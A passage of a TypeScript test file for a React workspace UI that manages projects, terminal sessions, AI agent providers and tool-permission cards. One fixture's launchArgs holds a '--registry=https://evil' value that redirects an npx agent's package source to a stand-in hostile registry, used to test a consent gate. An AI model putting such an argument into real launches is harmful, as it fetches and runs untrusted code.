    expect(projectsList).toHaveBeenCalledTimes(1);
  });

  it("clears the project-load error when the daemon disconnects and reconnects", async () => {
    // The daemon hook polls every 2 s, so the disconnect/reconnect ticks are
    // driven by fake timers instead of real waits.
    vi.useFakeTimers();
    try {
      let answerFirst!: (status: DaemonStatus) => void;
      let answerSecond!: (status: DaemonStatus) => void;
      let answerThird!: (status: DaemonStatus) => void;
      vi.mocked(daemonStatus)
        .mockImplementationOnce(
          () =>
            new Promise((resolve) => {
              answerFirst = resolve;
            }),
        )
        .mockImplementationOnce(
          () =>
            new Promise((resolve) => {
              answerSecond = resolve;
            }),
        )
        .mockImplementationOnce(
          () =>
            new Promise((resolve) => {
              answerThird = resolve;
            }),
        );
      vi.mocked(projectsList).mockRejectedValueOnce(new Error("journal is unavailable"));
      root = createRoot(container);
      await act(async () => root.render(<Workspace />));
      await act(async () => answerFirst(daemonConnected));
      await act(async () => undefined);

      // The first connected load failed; only the user or a fresh connected
      // transition may clear the error.
      expect(container.querySelector('[role="alert"]')?.textContent).toContain(
        "journal is unavailable",
      );
      expect(projectsList).toHaveBeenCalledTimes(1);

      await act(async () => {
        vi.advanceTimersByTime(2_000);
      });
      await act(async () => answerSecond(daemonDisconnected));
      await act(async () => undefined);
      await act(async () => {
        vi.advanceTimersByTime(2_000);
      });
      await act(async () => answerThird(daemonConnected));
      await act(async () => undefined);

      // The reconnect transition reloaded through the same load path and the
      // successful load cleared the error.
      expect(projectsList).toHaveBeenCalledTimes(2);
      expect(container.querySelector('[role="alert"]')).toBeNull();
      expect(container.textContent).toContain("main");
    } finally {
      vi.useRealTimers();
    }
  });

  it("reloads sessions and revives the watch when the daemon becomes connected", async () => {
    let answerDaemon!: (status: DaemonStatus) => void;
    vi.mocked(daemonStatus).mockImplementationOnce(
      () =>
        new Promise((resolve) => {
          answerDaemon = resolve;
        }),
    );
    vi.mocked(sessionsList).mockRejectedValueOnce(new Error("pipe not open"));
    vi.mocked(sessionsWatch).mockRejectedValueOnce(new Error("pipe not open"));
    root = createRoot(container);
    await act(async () => root.render(<Workspace />));
    await act(async () => undefined);

    expect(container.textContent).toContain("Could not load sessions");
    expect(container.querySelector("[data-testid=terminal-surface]")).toBeNull();

    await act(async () => answerDaemon(daemonConnected));
    await act(async () => undefined);

    expect(sessionsList).toHaveBeenCalledTimes(2);
    expect(sessionsWatch).toHaveBeenCalledTimes(2);
    expect(container.querySelector("[data-testid=terminal-surface]")?.textContent).toContain(
      "session-1",
    );
    expect(container.textContent).not.toContain("Could not load sessions");
  });

  it("shows recovered journal sessions in the tab strip beside a live one", async () => {
    vi.mocked(sessionsList).mockResolvedValue([
      {
        ...terminal("recovered-1", "recovered agent"),
        state: {
          type: "recovered",
          generation: 3,
          integrity: { kind: "unverifiable", droppedFrames: 0, droppedBytes: 0, trimmedBytes: 0 },
        },
      },
      terminal("live-1", "running agent"),
    ]);
    root = createRoot(container);
    await act(async () => root.render(<Workspace />));
    await act(async () => undefined);

    const tabs = [...container.querySelectorAll(".workspace-session-tab")];
    expect(tabs.map((tab) => tab.textContent)).toEqual([
      expect.stringContaining("recovered agent"),
      expect.stringContaining("running agent"),
    ]);
    // The recovered tab is visibly not live: the daemon's own word, not a
    // second name for the same state.
    expect(container.textContent).toContain("recovered · unverifiable");
  });

  it("keeps healthy projects visible, marks a failed project, and retries its load", async () => {
    vi.mocked(projectsList).mockResolvedValue([project, secondProject]);
    vi.mocked(workspacesList).mockImplementation(async (projectId) => {
      if (projectId === secondProject.id) throw new Error("workspace journal busy");
      return [workspace];
    });
    root = createRoot(container);
    await act(async () => root.render(<Workspace />));
    await act(async () => undefined);

    expect(container.textContent).toContain("devboule");
    expect(container.textContent).toContain("other-project");
    expect(container.textContent).toContain("workspace journal busy");
    expect(container.textContent).not.toContain("No matching workspaces");

    const search = container.querySelector<HTMLInputElement>('input[placeholder="Search"]');
    if (search === null) throw new Error("workspace search did not render");
    await act(async () => setSearchValue(search, "does-not-match"));
    expect(container.textContent).toContain("workspace journal busy");
    expect(container.textContent).toContain("Retry");
    await act(async () => setSearchValue(search, ""));

    vi.mocked(workspacesList).mockResolvedValue([secondWorkspace]);
    const retry = Array.from(container.querySelectorAll<HTMLButtonElement>("button")).find(
      (button) => button.textContent === "Retry",
    );
    if (retry === undefined) throw new Error("project retry control did not render");
    await act(async () => retry.click());
    await act(async () => undefined);

    expect(container.textContent).not.toContain("workspace journal busy");
    expect(container.textContent).toContain("other-main");
  });

  it("reconciles a project created while the initial project load is pending", async () => {
    const createdProject: Project = {
      id: "project-created-during-load",
      name: "created-during-load",
      path: "C:\\created-during-load",
    };
    const createdWorkspaceDuringLoad: IpcWorkspace = {
      id: "workspace-created-during-load",
      projectId: createdProject.id,
      title: "created-main",
      isolation: "local",
      path: "C:\\created-during-load",
    };
    let releaseInitialWorkspaces: ((value: IpcWorkspace[]) => void) | undefined;
    const initialWorkspaces = new Promise<IpcWorkspace[]>((resolve) => {
      releaseInitialWorkspaces = resolve;
    });
    vi.mocked(projectsList).mockResolvedValue([project]);
    vi.mocked(workspacesList).mockImplementation((projectId) =>
      projectId === project.id ? initialWorkspaces : Promise.resolve([createdWorkspaceDuringLoad]),
    );
    vi.mocked(projectAdd).mockResolvedValue(createdProject);
    root = createRoot(container);
    await act(async () => root.render(<Workspace />));
    await act(async () => undefined);

    const newProject = container.querySelector<HTMLButtonElement>('[aria-label="New project"]');
    if (newProject === null) throw new Error("new project control did not render");
    await act(async () => newProject.click());
    const input = container.querySelector<HTMLInputElement>("#workspace-project-input");
    if (input === null) throw new Error("project input did not render");
    setSearchValue(input, "C:\\created-during-load");
    const submit = Array.from(container.querySelectorAll<HTMLButtonElement>("button")).find(
      (button) => button.textContent === "Add project",
    );
    if (submit === undefined) throw new Error("project submit control did not render");
    await act(async () => submit.click());
    await act(async () => undefined);

    await act(async () => {
      if (releaseInitialWorkspaces === undefined) throw new Error("initial load was not pending");
      releaseInitialWorkspaces([workspace]);
    });
    await act(async () => undefined);

    expect(container.textContent).toContain("created-during-load");
    expect(container.textContent).toContain("created-main");
  });

  it("renders real session tabs, creates an ACP session, and never renders the permission card", async () => {
    root = createRoot(container);
    await act(async () => {
      root.render(<Workspace />);
    });
    await act(async () => undefined);

    expect(container.textContent).toContain("shell one");
    expect(container.querySelector(".permission-card")).toBeNull();
    expect(container.querySelector("[data-testid=terminal-surface]")?.textContent).toBe(
      "session-1",
    );
    expect(
      container.querySelector<HTMLElement>("[data-testid=terminal-surface]")?.dataset.workspaceId,
    ).toBe("workspace-1");

    const add = container.querySelector<HTMLButtonElement>(".workspace-session-add");
    if (add === null) throw new Error("session add control did not render");
    await act(async () => add.click());
    await act(async () => newTabMenuItem(container, "Agent").click());
    // Flush the async provider-choice chain (menu → Agent → chooseProvider →
    // providersList → sessionCreate) deliberately instead of trusting act's
    // incidental microtask draining.
    await act(async () => {});
    await act(async () => {});

    expect(sessionCreate).toHaveBeenCalledWith("workspace-1", "acp", "grok");
    expect(container.textContent).toContain("agent two");
    expect(container.querySelector("[data-testid=agent-chat-surface]")?.textContent).toBe(
      "session-2",
    );
  });

  it("renders the create error as a dismissible alert while a session is selected", async () => {
    vi.mocked(sessionCreate).mockRejectedValue(new Error("Authentication required: test-reason"));
    root = createRoot(container);
    await act(async () => {
      root.render(<Workspace />);
    });
    await act(async () => undefined);

    const add = container.querySelector<HTMLButtonElement>(".workspace-session-add");
    if (add === null) throw new Error("session add control did not render");
    await act(async () => add.click());
    await act(async () => newTabMenuItem(container, "Agent").click());
    await act(async () => undefined);

    expect(container.querySelector("[data-testid=terminal-surface]")).not.toBeNull();
    const banner = container.querySelector('[role="alert"]');
    if (banner === null) throw new Error("error banner did not render");
    expect(banner.textContent).toContain("Authentication required: test-reason");
    expect(container.textContent).not.toContain("unreachable");

    const dismiss = banner.querySelector<HTMLButtonElement>('[aria-label="Dismiss error"]');
    if (dismiss === null) throw new Error("dismiss control did not render");
    await act(async () => dismiss.click());
    await act(async () => undefined);

    expect(container.querySelector('[role="alert"]')).toBeNull();
  });

  it("renders the daemon echoed cwd in the terminal header input", async () => {
    vi.mocked(sessionsList).mockResolvedValue([
      { ...terminal("session-cwd", "shell"), cwd: "C:\\real\\workspace" },
    ]);
    root = createRoot(container);
    await act(async () => root.render(<Workspace />));
    await act(async () => undefined);

    expect(container.querySelector("[data-testid=terminal-surface]")?.textContent).toContain(
      "cwd:C:\\real\\workspace",
    );
  });

  it("starts an ACP session when a new workspace is added", async () => {
    root = createRoot(container);
    await act(async () => {
      root.render(<Workspace />);
    });
    await act(async () => undefined);

    const newWorkspace = container.querySelector<HTMLButtonElement>(".workspace-new-row");
    if (newWorkspace === null) throw new Error("new workspace control did not render");
    await act(async () => newWorkspace.click());

    expect(sessionCreate).toHaveBeenCalledWith("workspace-1", "acp", "grok");
    expect(container.querySelector("[data-testid=agent-chat-surface]")).not.toBeNull();
  });

  it("shows a workspace creation error without falling back or creating a session", async () => {
    // The reuse policy only mints when the project has no local workspace,
    // so this flow's refusal needs a project that has none.
    vi.mocked(workspacesList).mockResolvedValue([]);
    vi.mocked(workspaceCreate).mockRejectedValueOnce(
      new Error("worktree isolation is unimplemented"),
    );
    root = createRoot(container);
    await act(async () => root.render(<Workspace />));
    await act(async () => undefined);

    const newWorkspace = container.querySelector<HTMLButtonElement>(".workspace-new-row");
    if (newWorkspace === null) throw new Error("new workspace control did not render");
    await act(async () => newWorkspace.click());
    await act(async () => undefined);

    expect(container.querySelector('[role="alert"]')?.textContent).toContain(
      "worktree isolation is unimplemented",
    );
    expect(sessionCreate).not.toHaveBeenCalled();
  });

  const grokProvider = {
    id: "grok",
    executable: "grok.exe",
    acpAvailable: true,
    authentication: "unknown" as const,
    protocol: "acp",
  };
  const claudeProvider = {
    id: "claude",
    executable: "claude.exe",
    acpAvailable: false,
    authentication: "unknown" as const,
    protocol: "stream-json",
  };
  const npxProvider = {
    id: "codex-acp",
    executable: "@agentclientprotocol/codex-acp@1.10.0",
    acpAvailable: true,
    authentication: "unknown" as const,
    protocol: "acp" as const,
    origin: "npx-wrapper" as const,
    launchArgs: ["--registry=https://evil"],
  };

  it("lists chat-capable providers in a popover and creates claude when chosen", async () => {
    vi.mocked(providersList).mockResolvedValue({
      providers: [grokProvider, claudeProvider],
      unreadableDirs: 0,
    });
    vi.mocked(sessionCreate).mockResolvedValue({
      ...terminal("session-claude", "Agent"),
      kind: "claude",
    });
    root = createRoot(container);
    await act(async () => {
      root.render(<Workspace />);
    });
    await act(async () => undefined);

    const newWorkspace = container.querySelector<HTMLButtonElement>(".workspace-new-row");
    if (newWorkspace === null) throw new Error("new workspace control did not render");
    await act(async () => newWorkspace.click());
    await act(async () => undefined);

    expect(sessionCreate).not.toHaveBeenCalled();
    const menu = document.querySelector('[aria-label="Choose agent"]');
    if (menu === null) throw new Error("provider popover did not render");
    expect(menu.textContent).toContain("grok");
    expect(menu.textContent).toContain("claude");
    const groups = menu.querySelectorAll(".workspace-provider-group");
    expect(groups).toHaveLength(1);
    expect(groups[0].textContent).toContain("Installed");

    const claudeOption = Array.from(menu.querySelectorAll("button")).find(
      (button) => button.textContent === "claude",
    );
    if (claudeOption === undefined) throw new Error("claude option did not render");
    await act(async () => claudeOption.click());
    await act(async () => undefined);

    expect(sessionCreate).toHaveBeenCalledWith("workspace-1", "claude");
    expect(document.querySelector('[aria-label="Choose agent"]')).toBeNull();
  });

  it("creates immediately with the only chat-capable provider", async () => {
    vi.mocked(providersList).mockResolvedValue({
      providers: [grokProvider],
      unreadableDirs: 0,
    });
    root = createRoot(container);
    await act(async () => {
      root.render(<Workspace />);
    });
    await act(async () => undefined);

    const newWorkspace = container.querySelector<HTMLButtonElement>(".workspace-new-row");
    if (newWorkspace === null) throw new Error("new workspace control did not render");
    await act(async () => newWorkspace.click());
    await act(async () => undefined);

    expect(document.querySelector('[aria-label="Choose agent"]')).toBeNull();
    expect(sessionCreate).toHaveBeenCalledWith("workspace-1", "acp", "grok");
  });

  it("requires consent for the only npx provider before creating a session", async () => {
    vi.mocked(providersList).mockResolvedValue({
      providers: [npxProvider],
      unreadableDirs: 0,
    });
    root = createRoot(container);
    await act(async () => root.render(<Workspace />));
    await act(async () => undefined);

    const newWorkspace = container.querySelector<HTMLButtonElement>(".workspace-new-row");
    if (newWorkspace === null) throw new Error("new workspace control did not render");
    await act(async () => newWorkspace.click());
    await act(async () => undefined);

    expect(document.querySelector('[aria-label="Confirm agent"]')).not.toBeNull();
    expect(sessionCreate).not.toHaveBeenCalled();

    const confirm = document.querySelector<HTMLButtonElement>(".workspace-primary-action");
    if (confirm === null) throw new Error("Confirm button did not render");
    await act(async () => confirm.click());
    await act(async () => undefined);

    expect(sessionCreate).toHaveBeenCalledWith("workspace-1", "acp", "codex-acp");
  });

  it("surfaces a provider-list failure without creating a workspace or session", async () => {
    vi.mocked(providersList).mockRejectedValueOnce(new Error("provider catalog unavailable"));
    root = createRoot(container);
    await act(async () => root.render(<Workspace />));
    await act(async () => undefined);

    const newWorkspace = container.querySelector<HTMLButtonElement>(".workspace-new-row");
    if (newWorkspace === null) throw new Error("new workspace control did not render");
    await act(async () => newWorkspace.click());
    await act(async () => undefined);

    expect(container.querySelector('[role="alert"]')?.textContent).toContain(
      "provider catalog unavailable",
    );
    expect(workspaceCreate).not.toHaveBeenCalled();
    expect(sessionCreate).not.toHaveBeenCalled();
  });

  it("shows the create error only over the workspace it failed for", async () => {
    // Two workspaces in one project; the create is refused under the
    // selected one and the line must follow that workspace, not stay over
    // whichever is selected afterwards.
    vi.mocked(workspacesList).mockResolvedValue([workspace, otherWorkspace]);
    vi.mocked(sessionCreate).mockRejectedValueOnce({
      code: "io",
      message: "No ACP-capable agent was found on PATH.",
    });
    root = createRoot(container);
    await act(async () => {
      root.render(<Workspace />);
    });
    await act(async () => undefined);

    const add = container.querySelector<HTMLButtonElement>(".workspace-session-add");
    if (add === null) throw new Error("session add control did not render");
    await act(async () => add.click());
    await act(async () => newTabMenuItem(container, "Agent").click());
    await act(async () => {});
    await act(async () => {});

    // The strip's one error line carries the mapped sentence.
    expect(container.querySelector(".workspace-error-line")?.textContent).toContain(
      "No agent CLI is installed on this machine.",
    );

    // Switch to the project's other workspace: the failure is not theirs.
    const rows = container.querySelectorAll<HTMLButtonElement>("button.workspace-row");
    const other = [...rows].find((row) => row.textContent?.includes("other-main"));
    if (other === undefined) throw new Error("the other workspace row did not render");
    await act(async () => other.click());
    await act(async () => undefined);
    expect(container.querySelector(".workspace-error-line")).toBeNull();

    // Back to the failed one: the line is there to dismiss.
    const own = [...rows].find((row) => row.textContent?.includes("main"));
    if (own === undefined) throw new Error("the failed workspace's row did not render");
    await act(async () => own.click());
    await act(async () => undefined);
    expect(container.querySelector(".workspace-error-line")).not.toBeNull();
  });

  it("gates the new-workspace road when no chat-capable CLI is installed", async () => {
    vi.mocked(providersList).mockResolvedValue({
      providers: [
        {
          id: "codex",
          executable: "codex.exe",
          acpAvailable: false,
          authentication: "unknown",
          protocol: null,
        },
      ],
      unreadableDirs: 0,
    });
    root = createRoot(container);
    await act(async () => {
      root.render(<Workspace />);
    });
    await act(async () => undefined);

    const newWorkspace = container.querySelector<HTMLButtonElement>(".workspace-new-row");
    if (newWorkspace === null) throw new Error("new workspace control did not render");
    await act(async () => newWorkspace.click());
    await act(async () => undefined);

    // The gate: the empty picker opens, the doomed create never runs.
    const picker = document.querySelector('[aria-label="Choose agent"]');
    expect(picker).not.toBeNull();
    expect(picker?.textContent).toContain("No agent CLI is installed on this machine.");
    expect(sessionCreate).not.toHaveBeenCalled();
  });

  it("dismisses the provider popover on Escape without creating", async () => {
    vi.mocked(providersList).mockResolvedValue({
      providers: [grokProvider, claudeProvider],
      unreadableDirs: 0,
    });
    root = createRoot(container);
    await act(async () => {
      root.render(<Workspace />);
    });
    await act(async () => undefined);

    const newWorkspace = container.querySelector<HTMLButtonElement>(".workspace-new-row");
    if (newWorkspace === null) throw new Error("new workspace control did not render");
    await act(async () => newWorkspace.click());
    await act(async () => undefined);
    expect(document.querySelector('[aria-label="Choose agent"]')).not.toBeNull();

    await act(async () => {
      window.dispatchEvent(new KeyboardEvent("keydown", { key: "Escape", bubbles: true }));
    });

    expect(document.querySelector('[aria-label="Choose agent"]')).toBeNull();
    expect(sessionCreate).not.toHaveBeenCalled();
  });

  it("clicking New workspace twice before providersList resolves runs one flow and never mints a workspace", async () => {
    let release:
      | ((value: { providers: (typeof grokProvider)[]; unreadableDirs: number }) => void)
      | undefined;
    const pending = new Promise<{ providers: (typeof grokProvider)[]; unreadableDirs: number }>(
      (resolve) => {
        release = resolve;
      },
    );
    vi.mocked(providersList).mockImplementation(() => pending);
    root = createRoot(container);
    await act(async () => {
      root.render(<Workspace />);
    });
    await act(async () => undefined);

    const newWorkspace = container.querySelector<HTMLButtonElement>(".workspace-new-row");
    if (newWorkspace === null) throw new Error("new workspace control did not render");
    const rowsBefore = container.querySelectorAll(".workspace-row").length;

    await act(async () => {
      newWorkspace.click();
      newWorkspace.click();
    });
    expect(container.querySelectorAll(".workspace-row").length).toBe(rowsBefore);
    expect(sessionCreate).not.toHaveBeenCalled();

    await act(async () => {
      if (release === undefined) throw new Error("providersList was not called");
      release({ providers: [grokProvider], unreadableDirs: 0 });
    });
    await act(async () => undefined);

    // The reuse policy: no look-alike row is minted — the agent spawns in
    // the project's existing local workspace.
    expect(container.querySelectorAll(".workspace-row").length).toBe(rowsBefore);
    expect(workspaceCreate).not.toHaveBeenCalled();
    expect(sessionCreate).toHaveBeenCalledTimes(1);
    expect(sessionCreate).toHaveBeenCalledWith("workspace-1", "acp", "grok");
  });

  it("a session with no workspace stays visible in every workspace's strip", async () => {
    // A null-workspace session has no home to navigate to: it renders in
    // every strip (reopening it from History keeps it reachable), never
    // discarded by the workspace filter.
    vi.mocked(workspacesList).mockResolvedValue([workspace, secondWorkspace]);
    vi.mocked(sessionsList).mockResolvedValue([
      {
        id: "legacy-1",
        workspaceId: null,
        kind: "terminal",
        title: "legacy shell",
        state: { type: "live", generation: 3 },
        elapsedMs: 0,
      },
    ]);
    root = createRoot(container);
    await act(async () => root.render(<Workspace />));
    await act(async () => undefined);

    expect(container.querySelector("#workspace-session-tab-legacy-1")).not.toBeNull();

    const otherRow = [...container.querySelectorAll<HTMLButtonElement>(".workspace-row")].find(
      (row) => row.textContent?.includes("other-main") === true,
    );
    if (otherRow === undefined) throw new Error("second workspace row did not render");
    await act(async () => otherRow.click());

    // Still there after the switch, and the pane follows it.
    expect(container.querySelector("#workspace-session-tab-legacy-1")).not.toBeNull();
    expect(container.querySelector("[data-testid=terminal-surface]")?.textContent).toContain(
      "legacy-1",
    );
  });

  it("a project with no local workspace mints one, selects it, and starts the agent there", async () => {
    // The reuse policy only mints when the project has no local workspace;
    // this pins the success path of that fallback (review P3).
    vi.mocked(workspacesList).mockResolvedValue([]);
    vi.mocked(workspaceCreate).mockResolvedValue(createdWorkspace);
    vi.mocked(providersList).mockResolvedValue({
      providers: [{ ...grokProvider, protocol: "acp" }],
      unreadableDirs: 0,
    });
    root = createRoot(container);
    await act(async () => root.render(<Workspace />));
    await act(async () => undefined);

    const newWorkspace = container.querySelector<HTMLButtonElement>(".workspace-new-row");
    if (newWorkspace === null) throw new Error("new workspace control did not render");
    await act(async () => newWorkspace.click());
    await act(async () => undefined);

    expect(workspaceCreate).toHaveBeenCalledWith(project.id, "local");
    expect(sessionCreate).toHaveBeenCalledWith(createdWorkspace.id, "acp", "grok");
    // The created workspace is the selected one: its row is the pressed row.
    const selectedRow = container.querySelector<HTMLButtonElement>(
      "button[aria-pressed='true'].workspace-row",
    );
    expect(selectedRow?.textContent).toContain(createdWorkspace.title);
  });

  it("the double-mint guard holds while the first create is pending: clicks inside the real window mint once", async () => {
    // The review's window: providers resolve, the first workspaceCreate is
    // still pending, and a second click arrives. Releasing the guard at
    // provider resolution would mint a second look-alike workspace here.
    vi.mocked(workspacesList).mockResolvedValue([]);
    // Providers resolve immediately; the workspaceCreate below is what stays
    // pending (the review's window: providers resolved, create in flight,
    // second click arrives).
    vi.mocked(providersList).mockResolvedValue({
      providers: [{ ...grokProvider, protocol: "acp" }],
      unreadableDirs: 0,
    });
    // The first create stays pending: this is the window where an early
    // guard release would mint a second look-alike workspace.
    const pendingCreate = deferred<IpcWorkspace>();
    vi.mocked(workspaceCreate).mockImplementationOnce(() => pendingCreate.promise);
    root = createRoot(container);
    await act(async () => root.render(<Workspace />));
    await act(async () => undefined);

    const projectAdd = container.querySelector<HTMLButtonElement>(".workspace-project-add");
    if (projectAdd === null) throw new Error("project add control did not render");
    await act(async () => projectAdd.click());
    await act(async () => undefined);
    expect(workspaceCreate).toHaveBeenCalledTimes(1);
    expect(sessionCreate).not.toHaveBeenCalled();

    // Second click while the first create is still pending.
    await act(async () => projectAdd.click());
    await act(async () => undefined);
    expect(workspaceCreate).toHaveBeenCalledTimes(1);

    pendingCreate.resolve(createdWorkspace);
    await act(async () => undefined);
    await act(async () => undefined);

    expect(workspaceCreate).toHaveBeenCalledTimes(1);
    expect(sessionCreate).toHaveBeenCalledTimes(1);
    expect(sessionCreate).toHaveBeenCalledWith(createdWorkspace.id, "acp", "grok");
  });

  it("dismisses the provider popover on outside mousedown without creating", async () => {
    vi.mocked(providersList).mockResolvedValue({
      providers: [grokProvider, claudeProvider],
      unreadableDirs: 0,
    });
    root = createRoot(container);
    await act(async () => {
      root.render(<Workspace />);
    });
    await act(async () => undefined);

    const newWorkspace = container.querySelector<HTMLButtonElement>(".workspace-new-row");
    if (newWorkspace === null) throw new Error("new workspace control did not render");
    await act(async () => newWorkspace.click());
    await act(async () => undefined);
    expect(document.querySelector('[aria-label="Choose agent"]')).not.toBeNull();

    await act(async () => {
      document.body.dispatchEvent(new MouseEvent("mousedown", { bubbles: true }));
    });

    expect(document.querySelector('[aria-label="Choose agent"]')).toBeNull();
    expect(sessionCreate).not.toHaveBeenCalled();
  });

  it("opens History from the left sidebar", async () => {
    vi.mocked(journalUsage).mockResolvedValue(historyUsage);
    vi.mocked(sessionsList).mockResolvedValue([
      {
        ...terminal("session-1", "shell one"),
        workspaceId: "workspace-rust",
        state: {
          type: "ended",
          generation: 1,
          code: 0,
          integrity: { kind: "complete" },
        },
      },
    ]);
    root = createRoot(container);
    await act(async () => {
      root.render(<Workspace />);
    });
    await act(async () => undefined);
    const history = Array.from(container.querySelectorAll<HTMLButtonElement>("button")).find(
      (button) => button.textContent?.includes("History"),
    );
    if (!history) throw new Error("History button did not render");
    expect(history.getAttribute("aria-controls")).toBe("workspace-history-panel");
    await act(async () => history.click());
    await act(async () => undefined);
    expect(container.querySelector("#workspace-history-panel")).not.toBeNull();
    expect(container.textContent).toContain("Saved build history");
    expect(container.textContent).toContain("workspace-rust");
    expect(sessionDelete).not.toHaveBeenCalled();
  });

  it("keeps workspace and History searches independent across toggles", async () => {
    vi.mocked(journalUsage).mockResolvedValue(historyUsage);
    vi.mocked(sessionsList).mockResolvedValue([]);
    root = createRoot(container);
    await act(async () => {
      root.render(<Workspace />);
    });
    await act(async () => undefined);

    const search = container.querySelector<HTMLInputElement>('input[placeholder="Search"]');
    if (!search) throw new Error("search input did not render");
    const historyToggle = container.querySelector<HTMLButtonElement>(".workspace-history-button");
    if (!historyToggle) throw new Error("History toggle did not render");

    await act(async () => historyToggle.click());
    await act(async () => undefined);
    await act(async () => {
      setSearchValue(search, "history-only");
    });
    expect(search.value).toBe("history-only");
    await act(async () => historyToggle.click());
    expect(search.value).toBe("");
    expect(container.textContent).toContain("main");

    await act(async () => {
      setSearchValue(search, "missing");
    });
    expect(search.value).toBe("missing");
    expect(container.textContent).not.toContain("main");
    await act(async () => historyToggle.click());
    await act(async () => {
      setSearchValue(search, "Saved");
    });
    await act(async () => historyToggle.click());

    expect(search.value).toBe("missing");
    expect(container.textContent).not.toContain("main");
  });

  it("does not render a permission card before typed_permissions is negotiated", async () => {
    root = createRoot(container);
    await act(async () => {
      root.render(
        <WorkspacePermissionCard
          sessionId="session-1"
          subscriptionId={41}
          request={permissionRequest}
          capabilities={[]}
        />,
      );
    });

    expect(container.querySelector(".permission-card")).toBeNull();
    expect(sessionPermissionRespond).not.toHaveBeenCalled();
  });

  it("sends one real allow-once response for a negotiated permission card", async () => {
    root = createRoot(container);
    await act(async () => {
      root.render(
        <WorkspacePermissionCard
          sessionId="session-1"
          subscriptionId={41}
          request={permissionRequest}
          capabilities={["typed_permissions"]}
        />,
      );
    });

    const allow = container.querySelector<HTMLButtonElement>(".permission-card-primary-action");
    if (allow === null) throw new Error("permission allow control did not render");
    await act(async () => {
      allow.click();
      allow.click();
    });

    expect(sessionPermissionRespond).toHaveBeenCalledTimes(1);
    expect(sessionPermissionRespond).toHaveBeenCalledWith(
      "session-1",
      41,
      "tool-test",
      "allow_once",
    );
  });

  it("renders the deny and allow-once controls with their kind classes", async () => {
    const optionsRequest: PermissionRequest = {
      type: "permission_request",
      toolCallId: "tool-a",
      title: "Run command",
      options: [
        { optionId: "allow-once", name: "Allow once", kind: "allow_once" },
        { optionId: "always", name: "Allow for this session", kind: "allow_always" },
        { optionId: "reject", name: "Reject", kind: "reject_once" },
      ],
    };
    root = createRoot(container);
    await act(async () => {
      root.render(
        <WorkspacePermissionCard
          sessionId="session-2"
          subscriptionId={41}
          request={optionsRequest}
          capabilities={["typed_permissions"]}
        />,
      );
    });

    const buttons = [
      ...container.querySelectorAll<HTMLButtonElement>(".permission-card-actions button"),
    ];
    expect(buttons.map((button) => button.textContent)).toEqual(["Deny", "Allow once"]);
    expect(buttons[0].className).toContain("permission-card-secondary-action");
    expect(buttons[0].className).toContain("permission-card-deny-action");
    expect(buttons[1].className).toContain("permission-card-primary-action");
    expect(buttons[1].className).not.toContain("permission-card-deny-action");

    await act(async () => {
      buttons[1].click();
    });
    expect(sessionPermissionRespond).toHaveBeenCalledWith("session-2", 41, "tool-a", "allow_once");
  });

  it("sends the deny outcome without an option id when deny is clicked", async () => {
    root = createRoot(container);
    await act(async () => {
      root.render(
        <WorkspacePermissionCard
          sessionId="session-2"
          subscriptionId={41}
          request={{
            type: "permission_request",
            toolCallId: "tool-a",
            title: "Run command",
            options: [
              { optionId: "allow-once", name: "Allow once", kind: "allow_once" },
              { optionId: "reject", name: "Reject", kind: "reject_once" },
            ],
          }}
          capabilities={["typed_permissions"]}
        />,
      );
    });

    const reject = container.querySelector<HTMLButtonElement>(".permission-card-deny-action");
    if (reject === null) throw new Error("permission reject control did not render");
    await act(async () => {
      reject.click();
    });
    expect(sessionPermissionRespond).toHaveBeenCalledWith("session-2", 41, "tool-a", "deny");
  });

  it("shows a fresh waiting card when a new request replaces one mid-flight", async () => {
    const requestA: PermissionRequest = {
      type: "permission_request",
      toolCallId: "tool-a",
      title: "First command",
      options: [{ optionId: "allow", name: "Allow once", kind: "allow_once" }],
    };
    const requestB: PermissionRequest = {
      type: "permission_request",
      toolCallId: "tool-b",
      title: "Second command",
      options: [{ optionId: "reject", name: "Reject", kind: "reject_once" }],
    };
    let resolveRespond!: (value: undefined) => void;
    const respondGate = new Promise<undefined>((resolve) => {
      resolveRespond = resolve;
    });
    vi.mocked(sessionPermissionRespond).mockImplementationOnce(() => respondGate);
    root = createRoot(container);
    await act(async () => {
      root.render(
        <WorkspacePermissionCard
          key="tool-a"
          sessionId="session-1"
          subscriptionId={41}
          request={requestA}
          capabilities={["typed_permissions"]}
        />,
      );
    });

    const allow = container.querySelector<HTMLButtonElement>(".permission-card-primary-action");
    if (allow === null) throw new Error("permission allow control did not render");
    await act(async () => {
      allow.click();
    });
    expect(container.querySelector(".permission-card-label")?.textContent).toBe(
      "Sending decision…",
    );

    await act(async () => {
      root.render(
        <WorkspacePermissionCard
          key="tool-b"
          sessionId="session-1"
          subscriptionId={41}
          request={requestB}
          capabilities={["typed_permissions"]}
        />,
      );
    });
    expect(container.querySelector(".permission-card-label")?.textContent).toBe("Waiting on you");
    const buttons = [
      ...container.querySelectorAll<HTMLButtonElement>(".permission-card-actions button"),
    ];
    expect(buttons.map((button) => button.textContent)).toEqual(["Deny", "Allow once"]);
    expect(buttons[1].disabled).toBe(true);

    await act(async () => {
      resolveRespond(undefined);
      await respondGate;
    });
    expect(container.querySelector(".permission-card-label")?.textContent).toBe("Waiting on you");
  });

  it("disables every outcome and never responds when no options are offered", async () => {
    root = createRoot(container);
    await act(async () => {
      root.render(
        <WorkspacePermissionCard
          sessionId="session-1"
          subscriptionId={41}
          request={{
            type: "permission_request",
            toolCallId: "tool-legacy",
            title: "Run command",
            options: [],
          }}
          capabilities={["typed_permissions"]}
        />,
      );
    });

    const buttons = [
      ...container.querySelectorAll<HTMLButtonElement>(".permission-card-actions button"),
    ];
    expect(buttons.map((button) => button.textContent)).toEqual(["Deny", "Allow once"]);
    expect(buttons.every((button) => button.disabled)).toBe(true);
    expect(container.textContent).toContain("Deny is not offered for this request.");
    expect(container.textContent).toContain("Allow once is not offered for this request.");
    expect(sessionPermissionRespond).not.toHaveBeenCalled();
  });

  it("renders the permission card inside the conversation, above the composer", async () => {
    root = createRoot(container);
    await act(async () => {
      root.render(<Workspace />);
    });
    await act(async () => undefined);

    const add = container.querySelector<HTMLButtonElement>(".workspace-session-add");
    if (add === null) throw new Error("session add control did not render");
    await act(async () => add.click());
    await act(async () => newTabMenuItem(container, "Agent").click());
    await act(async () => undefined);

    const emitA = container.querySelector<HTMLButtonElement>("[data-testid=emit-permission-a]");
    if (emitA === null) throw new Error("permission emitter did not render");
    await act(async () => emitA.click());

    const card = container.querySelector(".permission-card");
    if (card === null) throw new Error("permission card did not render");
    const surface = container.querySelector('[data-testid="agent-chat-surface"]');
    if (surface === null) throw new Error("agent chat surface did not render");
